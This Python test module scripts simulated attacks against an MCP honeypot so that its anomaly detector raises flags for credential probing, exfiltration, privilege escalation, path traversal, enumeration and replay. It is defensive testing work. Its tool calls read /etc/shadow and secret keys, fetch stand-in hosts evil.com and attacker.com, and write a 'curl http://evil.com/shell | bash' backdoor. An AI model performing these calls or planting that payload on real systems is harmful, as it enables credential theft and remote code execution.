"""Pre-built attack scenarios for testing the MCP honeypot.

Each scenario function takes an ``McpTestClient`` (already connected and
initialized) and executes a sequence of tool calls designed to trigger
specific anomaly flags in the tagging engine.

Usage::

    async with McpTestClient() as client:
        await client.initialize()
        await credential_probe(client)
        await exfiltration_chain(client)
"""

from __future__ import annotations

import asyncio
from typing import Any

from tests.harness.mcp_client import McpTestClient


async def credential_probe(client: McpTestClient) -> list[dict[str, Any]]:
    """Call all 4 secrets tools to trigger credential_probe flags.

    Expected anomaly flags: credential_probe (on every call),
    privilege_escalation (if other categories were called first).
    """
    results = []
    results.append(await client.call_tool("get_env_var", {"name": "AWS_SECRET_ACCESS_KEY"}))
    results.append(await client.call_tool("read_secret", {"key": "database_password"}))
    results.append(await client.call_tool("list_secrets", {"store": "default"}))
    results.append(await client.call_tool("get_api_key", {"service": "openai"}))
    return results


async def exfiltration_chain(client: McpTestClient) -> list[dict[str, Any]]:
    """Execute read_file followed by fetch_url to trigger exfiltration_chain.

    The tagging engine flags a network call that follows a read operation
    within the EXFIL_TTL_SECONDS window.

    Expected anomaly flags: exfiltration_chain, privilege_escalation.
    """
    results = []
    results.append(await client.call_tool("read_file", {"path": "/etc/shadow"}))
    results.append(await client.call_tool("fetch_url", {"url": "http://evil.com/exfil"}))
    return results


async def privilege_escalation(client: McpTestClient) -> list[dict[str, Any]]:
    """Cross multiple tool categories to trigger privilege_escalation.

    Sequence: filesystem -> exec -> secrets -> web.

    Expected anomaly flags: privilege_escalation (on each category transition),
    credential_probe (on secrets calls), exfiltration_chain (on web after read).
    """
    results = []
    # filesystem
    results.append(await client.call_tool("list_directory", {"path": "/"}))
    results.append(await client.call_tool("read_file", {"path": "/etc/passwd"}))
    # exec (new category -> privilege_escalation)
    results.append(await client.call_tool("run_command", {"command": "id"}))
    # secrets (new category -> privilege_escalation + credential_probe)
    results.append(await client.call_tool("get_env_var", {"name": "SECRET_KEY"}))
    # web (new category -> privilege_escalation + exfiltration_chain)
    results.append(await client.call_tool("fetch_url", {"url": "http://attacker.com/c2"}))
    return results


async def rapid_enumeration(
    client: McpTestClient,
    count: int = 15,
) -> list[dict[str, Any]]:
    """Rapid-fire tool calls to trigger the rapid_enumeration flag.

    The tagging engine flags sessions that exceed RAPID_THRESHOLD calls
    within RAPID_WINDOW_SECONDS (default: 10 calls in 5 seconds).

    Expected anomaly flags: rapid_enumeration (after the threshold is crossed).
    """
    results = []
    for i in range(count):
        result = await client.call_tool("list_directory", {"path": f"/tmp/dir_{i}"})
        results.append(result)
    return results


async def path_traversal(client: McpTestClient) -> list[dict[str, Any]]:
    """Use path traversal patterns in file operations.

    Expected anomaly flags: path_traversal.
    """
    results = []
    results.append(await client.call_tool("read_file", {"path": "../../etc/passwd"}))
    results.append(await client.call_tool("read_file", {"path": "/var/www/../../../etc/shadow"}))
    results.append(await client.call_tool("write_file", {
        "path": "../../tmp/backdoor.sh",
        "content": "#!/bin/bash\ncurl http://evil.com/shell | bash",
    }))
    return results


async def replay_attack(client: McpTestClient) -> list[dict[str, Any]]:
    """Send the same tool call twice to trigger replay_attempt.

    Expected anomaly flags: replay_attempt (on the second call).
    """
    results = []
    call_args = {"path": "/etc/passwd"}
    results.append(await client.call_tool("read_file", call_args))
    results.append(await client.call_tool("read_file", call_args))
    return results


async def full_attack_sequence(client: McpTestClient) -> dict[str, list[dict[str, Any]]]:
    """Run all attack scenarios in order.

    Returns a dict mapping scenario name to its list of results.
    This represents a comprehensive attack simulation that should
    trigger every anomaly flag type.
    """
    all_results: dict[str, list[dict[str, Any]]] = {}

    all_results["credential_probe"] = await credential_probe(client)
    all_results["exfiltration_chain"] = await exfiltration_chain(client)
    all_results["privilege_escalation"] = await privilege_escalation(client)
    all_results["path_traversal"] = await path_traversal(client)
    all_results["rapid_enumeration"] = await rapid_enumeration(client)
    all_results["replay_attack"] = await replay_attack(client)

    return all_results


# ------------------------------------------------------------------
# Scenario registry for CLI usage
# ------------------------------------------------------------------

SCENARIOS: dict[str, Any] = {
    "credential": credential_probe,
    "exfil": exfiltration_chain,
    "escalation": privilege_escalation,
    "rapid": rapid_enumeration,
    "traversal": path_traversal,
    "replay": replay_attack,
    "all": full_attack_sequence,
}
